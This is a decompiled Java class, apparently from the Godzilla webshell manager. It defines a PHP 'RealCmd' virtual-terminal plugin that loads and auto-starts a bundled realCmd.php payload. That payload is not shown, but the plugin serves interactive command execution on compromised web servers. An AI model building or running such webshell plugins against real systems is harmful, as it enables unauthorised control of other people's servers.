/*    */ package shells.plugins.php;
/*    */ 
/*    */ import core.annotation.PluginAnnotation;
/*    */ import java.io.InputStream;
/*    */ import shells.plugins.generic.RealCmd;
/*    */ import util.Log;
/*    */ import util.functions;
/*    */ 
/*    */ @PluginAnnotation(payloadName = "PhpDynamicPayload", Name = "RealCmd", DisplayName = "虚拟终端")
/*    */ public class PRealCmd
/*    */   extends RealCmd
/*    */ {
/*    */   private static final String CLASS_NAME = "plugin.RealCmd";
/*    */   
/*    */   public byte[] readPlugin() {
/* 16 */     byte[] data = null;
/*    */     try {
/* 18 */       InputStream inputStream = getClass().getResourceAsStream("assets/realCmd.php");
/* 19 */       data = functions.readInputStream(inputStream);
/* 20 */       inputStream.close();
/* 21 */     } catch (Exception e) {
/* 22 */       Log.error(e);
/*    */     } 
/* 24 */     return data;
/*    */   }
/*    */ 
/*    */   
/*    */   public boolean isTryStart() {
/* 29 */     return true;
/*    */   }
/*    */ 
/*    */   
/*    */   public String getClassName() {
/* 34 */     return "plugin.RealCmd";
/*    */   }
/*    */ }


/* Location:              C:\User\\user\Downloads\godzilla.jar!\shells\plugins\php\PRealCmd.class
 * Java compiler version: 8 (52.0)
 * JD-Core Version:       1.1.3
 */